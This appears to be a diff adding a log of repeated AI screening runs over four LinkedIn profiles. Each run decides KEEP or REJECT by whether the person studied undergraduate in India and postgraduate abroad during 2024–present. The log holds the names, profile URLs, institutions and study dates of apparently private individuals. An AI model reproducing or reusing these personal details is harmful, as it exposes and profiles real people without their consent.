+* **PG_INSTITUTION:** Arizona State University
+* **PG_LOCATION:** Tempe, Arizona
+* **PG_COUNTRY:** USA
+* **PG_START_YEAR:** Unknown
+* **PG_END_YEAR:** Unknown
+* **PG_EVIDENCE:** Arizona State University is a recognized university located in the USA (outside India). However, no enrollment or graduation dates are provided in the raw profile text.
+
+**STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES**
+* No external or irrelevant universities were misidentified.
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+
+* **UG in India?** Yes (Visvesvaraya Technological University)
+* **PG Outside India?** Yes (Arizona State University)
+* **PG overlaps with 2024–present?** Unknown (No dates are listed in the profile for the PG degree).
+
+**FINAL DECISION:**
+**REJECT**
+
+**Reason:**
+The profile owner's undergraduate education is in India and their postgraduate education is outside India. However, because there are no dates associated with the postgraduate degree, it is impossible to determine if the program overlaps with the required 2024–present (2026) period. According to the rules, profiles with unknown/unclear PG dates must be rejected.
+
+
+================================================================================
+PROFILE 4
+URL: https://www.linkedin.com/in/nikhileshgunnam/
+================================================================================
+
+Based on the provided LinkedIn profile text, here is the step-by-step analysis:
+
+### STEP 1 — IDENTIFY THE PROFILE OWNER
+* **Profile Owner:** Nikhilesh Gunnam (identified from the URL)
+
+### STEP 2 — FIND THE PERSON'S EDUCATION
+The profile contains two clear education entries belonging to the profile owner:
+1. Syracuse University College of Engineering and Computer Science (Master of Science - MS)
+2. Vellore Institute of Technology (Bachelor of Technology - BTech)
+
+### STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION
+* **UG_DEGREE:** Bachelor of Technology - BTech, Computer Science
+* **UG_INSTITUTION:** Vellore Institute of Technology
+* **UG_LOCATION:** Vellore, Tamil Nadu
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** "Vellore Institute of Technology Bachelor of Technology - BTech, Computer Science 2019 – 2023"
+* **UG in India?** Yes
+
+### STEP 4 — IDENTIFY POSTGRADUATE EDUCATION
+* **PG_DEGREE:** Master of Science - MS
+* **PG_INSTITUTION:** Syracuse University College of Engineering and Computer Science
+* **PG_LOCATION:** Syracuse, New York
+* **PG_COUNTRY:** USA (Outside India)
+* **PG_START_YEAR:** 2023
+* **PG_END_YEAR:** 2025
+* **PG_EVIDENCE:** "Syracuse University College of Engineering and Computer Science Master of Science - MS Sep 2023 – May 2025"
+* **PG Outside India?** Yes
+
+### STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES
+No other universities or conflicting posts are mentioned in the text.
+
+### STEP 6 — DETERMINE THE FINAL RESULT
+
+* **Condition A (UG in India):** Yes (Vellore Institute of Technology)
+* **Condition B (PG Outside India):** Yes (Syracuse University, USA)
+* **Condition C (PG overlaps with 2024–present):** Yes (The PG program ran from September 2023 to May 2025, which overlaps with the 2024–present timeframe).
+
+**Result:**
+**KEEP**
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Name:** Manvi Mishra
+
+**STEP 2 & 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Technology - BTech, Computer Science
+* **UG_INSTITUTION:** Banasthali Vidyapith
+* **UG_LOCATION:** Rajasthan
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Education section shows "Bachelor of Technology - BTech, Computer Science" at Banasthali Vidyapith (2024 – 2028), which is a well-known university located in India.
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Not Found
+* **PG_INSTITUTION:** Not Found
+* **PG_LOCATION:** Not Found
+* **PG_COUNTRY:** Not Found
+* **PG_START_YEAR:** Not Applicable
+* **PG_END_YEAR:** Not Applicable
+* **PG_EVIDENCE:** No postgraduate degree/program is mentioned in the profile.
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+
+**Result:** REJECT
+
+**Reason:** No foreign postgraduate education is supported by the profile. The profile owner is currently pursuing their undergraduate degree (2024 – 2028).
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/ritesh-pandey-aa7a82129/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Name:** Ritesh Pandey
+
+**STEP 2 — FIND THE PERSON'S EDUCATION**
+* **Undergraduate (UG):** Bachelor of Science (BS) in Information Technology from University of Mumbai (Jun 2009 – May 2012).
+* **Postgraduate (PG):** Postgraduate Degree in Marketing/Marketing Management from Welingkar Institute of Management (Jul 2015 – May 2017).
+
+**STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Science - BS
+* **UG_INSTITUTION:** University of Mumbai
+* **UG_LOCATION:** Mumbai, Maharashtra
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** University of Mumbai is a prominent public state university located in Mumbai, India.
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Postgraduate Degree (Marketing/Marketing Management, General)
+* **PG_INSTITUTION:** Welingkar Institute of Management
+* **PG_LOCATION:** Mumbai/Bengaluru
+* **PG_COUNTRY:** India
+* **PG_EVIDENCE:** "Welingkar Institute of Management" (Prin. L. N. Welingkar Institute of Management Development & Research) is a well-known business school in India.
+* **PG_START_YEAR:** 2015
+* **PG_END_YEAR:** 2017
+
+---
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+
+* **UG from India?** Yes (University of Mumbai)
+* **PG from Outside India?** No (Welingkar Institute of Management is in India)
+* **PG Overlaps 2024-Present?** No (Ended in 2017)
+
+**Result:** REJECT
+
+**Reason:** The profile owner's postgraduate education is from India, not outside India. Additionally, the postgraduate program (2015 - 2017) does not overlap with the required 2024-present period.
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/anushwar/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Name:** Anushwar (deduced from LinkedIn URL)
+
+**STEP 2 — FIND THE PERSON'S EDUCATION**
+* **Undergraduate:** Visvesvaraya Technological University, Bachelor of Engineering - BE, Computer Science
+* **Postgraduate:** Arizona State University, Master of Science - MS, Computer Engineering (Computer Systems)
+
+**STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Engineering - BE, Computer Science
+* **UG_INSTITUTION:** Visvesvaraya Technological University
+* **UG_LOCATION:** Karnataka
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Visvesvaraya Technological University is a well-known public state university in India.
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Master of Science - MS, Computer Engineering (Computer Systems)
+* **PG_INSTITUTION:** Arizona State University
+* **PG_LOCATION:** Arizona
+* **PG_COUNTRY:** USA
+* **PG_START_YEAR:** Unknown (Not provided in the profile)
+* **PG_END_YEAR:** Unknown (Not provided in the profile)
+* **PG_EVIDENCE:** Listed under the Education section for Arizona State University.
+
+**STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES**
+* No external universities are mentioned in the text.
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+
+**Result:** REJECT
+
+**Reason:** 
+While the profile owner's undergraduate education is from India (Visvesvaraya Technological University) and the postgraduate education is from outside India (Arizona State University), there are no dates/years provided in the profile for the postgraduate program. Because the PG dates are unknown, it is impossible to determine whether the education overlaps with the required 2024-present period. Therefore, the profile must be rejected according to the date rules.
+
+
+================================================================================
+PROFILE 4
+URL: https://www.linkedin.com/in/nikhileshgunnam/
+================================================================================
+
+Based on the raw LinkedIn profile provided, here is the step-by-step analysis:
+
+### STEP 1 — IDENTIFY THE PROFILE OWNER
+* **Name:** Nikhilesh Gunnam (identified from the profile URL)
+
+---
+
+### STEP 2 — FIND THE PERSON'S EDUCATION
+* **Undergraduate (UG) Degree:** Bachelor of Technology - BTech, Computer Science from Vellore Institute of Technology (2019 – 2023)
+* **Postgraduate (PG) Degree:** Master of Science - MS from Syracuse University College of Engineering and Computer Science (Sep 2023 – May 2025)
+
+---
+
+### STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION
+* **UG_DEGREE:** Bachelor of Technology - BTech, Computer Science
+* **UG_INSTITUTION:** Vellore Institute of Technology
+* **UG_LOCATION:** Vellore, Tamil Nadu
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Vellore Institute of Technology is a highly recognized educational institution located in India.
+* **UG In India?** Yes
+
+---
+
+### STEP 4 — IDENTIFY POSTGRADUATE EDUCATION
+* **PG_DEGREE:** Master of Science - MS
+* **PG_INSTITUTION:** Syracuse University College of Engineering and Computer Science
+* **PG_LOCATION:** Syracuse, New York
+* **PG_COUNTRY:** USA
+* **PG_EVIDENCE:** Syracuse University is a major research university located in the United States.
+* **PG_START_YEAR:** 2023
+* **PG_END_YEAR:** 2025
+* **PG Outside India?** Yes
+
+---
+
+### STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES
+No other external universities are mentioned in the profile. The identified UG and PG programs clearly belong to the profile owner.
+
+---
+
+### STEP 6 — DETERMINE THE FINAL RESULT
+
+* **Condition A (UG in India?):** Yes (Vellore Institute of Technology, India)
+* **Condition B (PG outside India?):** Yes (Syracuse University, USA)
+* **Condition C (PG overlaps with 2024-present?):** Yes. The PG program duration is September 2023 to May 2025, which overlaps with the 2024–present (2026) period.
+
+### FINAL DECISION
+**KEEP**
+
+### Reason:
+The profile owner completed their undergraduate education in India, is pursuing/completed a postgraduate program outside India, and the postgraduate program timeline (2023 - 2025) overlaps with the required 2024-present window.
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+STEP 1 — IDENTIFY THE PROFILE OWNER
+The profile owner is Manvi Mishra.
+
+STEP 2 — FIND THE PERSON'S EDUCATION
+* Bachelor of Technology (BTech) in Computer Science from Banasthali Vidyapith (2024 – 2028).
+* HighSchool from Little Flower School, Gorakhpur.
+
+STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION
+* UG_DEGREE: Bachelor of Technology - BTech, Computer Science
+* UG_INSTITUTION: Banasthali Vidyapith
+* UG_LOCATION: India
+* UG_COUNTRY: India
+* UG_EVIDENCE: Explicitly listed in the education section. Banasthali Vidyapith is a recognized university in Rajasthan, India.
+
+STEP 4 — IDENTIFY POSTGRADUATE EDUCATION
+* PG_DEGREE: Not Found
+* PG_INSTITUTION: Not Found
+* PG_LOCATION: Not Found
+* PG_COUNTRY: Not Found
+* PG_EVIDENCE: None
+* PG_START_YEAR: Unknown
+* PG_END_YEAR: Unknown
+
+STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES
+No other universities are mentioned in the profile text.
+
+STEP 6 — DETERMINE THE FINAL RESULT
+The profile owner has an undergraduate degree from India (ongoing, 2024–2028) but does not have any postgraduate education listed in the profile.
+
+DECISION: REJECT
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/ritesh-pandey-aa7a82129/
+================================================================================
+
+STEP 1 — IDENTIFY THE PROFILE OWNER
+Name: Ritesh Pandey
+
+STEP 2 — FIND THE PERSON'S EDUCATION
+- Bachelor of Science - BS, Information Technology from University of Mumbai (Jun 2009 – May 2012)
+- Postgraduate Degree, Marketing/Marketing Management, General from Welingkar Institute of Management (Jul 2015 – May 2017)
+
+STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION
+- UG_DEGREE: Bachelor of Science - BS
+- UG_INSTITUTION: University of Mumbai
+- UG_LOCATION: Mumbai
+- UG_COUNTRY: India
+- UG_EVIDENCE: Jun 2009 – May 2012
+
+STEP 4 — IDENTIFY POSTGRADUATE EDUCATION
+- PG_DEGREE: Postgraduate Degree, Marketing/Marketing Management, General
+- PG_INSTITUTION: Welingkar Institute of Management
+- PG_LOCATION: Mumbai/Bengaluru
+- PG_COUNTRY: India
+- PG_START_YEAR: 2015
+- PG_END_YEAR: 2017
+- PG_EVIDENCE: Jul 2015 – May 2017
+
+STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES
+The postgraduate education is from Welingkar Institute of Management, which is located in India.
+
+STEP 6 — DETERMINE THE FINAL RESULT
+The postgraduate education is from India (Welingkar Institute of Management), not outside India. Additionally, the postgraduate program took place from 2015 to 2017, which does not overlap with the required 2024–present (2026) period.
+
+DECISION: REJECT
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/anushwar/
+================================================================================
+
+FILTER ERROR
+
+
+
+================================================================================
+PROFILE 4
+URL: https://www.linkedin.com/in/nikhileshgunnam/
+================================================================================
+
+FILTER ERROR
+
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+DECISION: REJECT
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/ritesh-pandey-aa7a82129/
+================================================================================
+
+STEP 1 — IDENTIFY THE PROFILE OWNER
+Name: Ritesh Pandey
+
+STEP 2 — FIND THE PERSON'S EDUCATION
+- Bachelor of Science - BS, Information Technology from University of Mumbai (Jun 2009 – May 2012)
+- Postgraduate Degree, Marketing/Marketing Management, General from Welingkar Institute of Management (Jul 2015 – May 2017)
+
+STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION
+UG_DEGREE: Bachelor of Science - BS, Information Technology
+UG_INSTITUTION: University of Mumbai
+UG_LOCATION: Mumbai, India
+UG_COUNTRY: India
+UG_EVIDENCE: University of Mumbai is a well-known Indian university.
+
+STEP 4 — IDENTIFY POSTGRADUATE EDUCATION
+PG_DEGREE: Postgraduate Degree, Marketing/Marketing Management, General
+PG_INSTITUTION: Welingkar Institute of Management
+PG_LOCATION: Mumbai/Bengaluru, India
+PG_COUNTRY: India
+PG_EVIDENCE: Welingkar Institute of Management is an Indian business school.
+PG_START_YEAR: 2015
+PG_END_YEAR: 2017
+
+STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES
+Not applicable (no other universities mentioned).
+
+STEP 6 — DETERMINE THE FINAL RESULT
+The person's undergraduate education is from India, but the postgraduate education is also from India (not outside India) and does not overlap with the 2024–present period.
+
+DECISION: REJECT
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/anushwar/
+================================================================================
+
+STEP 1 — IDENTIFY THE PROFILE OWNER
+The profile owner is Anushwar.
+
+STEP 2 — FIND THE PERSON'S EDUCATION
+- Bachelor of Engineering - BE in Computer Science from Visvesvaraya Technological University
+- Master of Science - MS in Computer Engineering (Computer Systems) from Arizona State University
+
+STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION
+- UG_DEGREE: Bachelor of Engineering - BE, Computer Science
+- UG_INSTITUTION: Visvesvaraya Technological University
+- UG_LOCATION: Karnataka
+- UG_COUNTRY: India
+- UG_EVIDENCE: Visvesvaraya Technological University is a well-known public state university in Karnataka, India.
+
+STEP 4 — IDENTIFY POSTGRADUATE EDUCATION
+- PG_DEGREE: Master of Science - MS, Computer Engineering (Computer Systems)
+- PG_INSTITUTION: Arizona State University
+- PG_LOCATION: Tempe, Arizona
+- PG_COUNTRY: USA
+- PG_START_YEAR: Unknown
+- PG_END_YEAR: Unknown
+- PG_EVIDENCE: Arizona State University is located in the USA (outside India).
+
+STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES
+Both institutions listed are explicitly part of the profile owner's education history.
+
+STEP 6 — DETERMINE THE FINAL RESULT
+While the undergraduate education is in India and the postgraduate education is outside India, the profile does not provide any dates (start year or end year) for the postgraduate degree. Since the PG dates cannot be established, it is impossible to verify whether the PG program overlaps with the 2024–present period. 
+
+DECISION: REJECT
+
+
+================================================================================
+PROFILE 4
+URL: https://www.linkedin.com/in/nikhileshgunnam/
+================================================================================
+
+STEP 1 — IDENTIFY THE PROFILE OWNER
+Name: Nikhilesh Gunnam
+
+STEP 2 — FIND THE PERSON'S EDUCATION
+* BTech from Vellore Institute of Technology (2019 – 2023)
+* MS from Syracuse University College of Engineering and Computer Science (Sep 2023 – May 2025)
+
+STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION
+* UG_DEGREE: Bachelor of Technology - BTech, Computer Science
+* UG_INSTITUTION: Vellore Institute of Technology
+* UG_COUNTRY: India
+* UG_EVIDENCE: Vellore Institute of Technology is a well-known, recognized university in India.
+
+STEP 4 — IDENTIFY POSTGRADUATE EDUCATION
+* PG_DEGREE: Master of Science - MS
+* PG_INSTITUTION: Syracuse University College of Engineering and Computer Science
+* PG_COUNTRY: United States (Outside India)
+* PG_START_YEAR: 2023
+* PG_END_YEAR: 2025
+* PG_EVIDENCE: Syracuse University is a recognized university in the United States.
+
+STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES
+The listed education belongs directly to the profile owner's education section.
+
+STEP 6 — DETERMINE THE FINAL RESULT
+* UG is from India (Vellore Institute of Technology) -> YES
+* PG is from outside India (Syracuse University) -> YES
+* PG overlaps with the 2024 to present (2026) period -> YES (Sep 2023 – May 2025)
+
+All conditions are satisfied.
+
+DECISION: KEEP
+
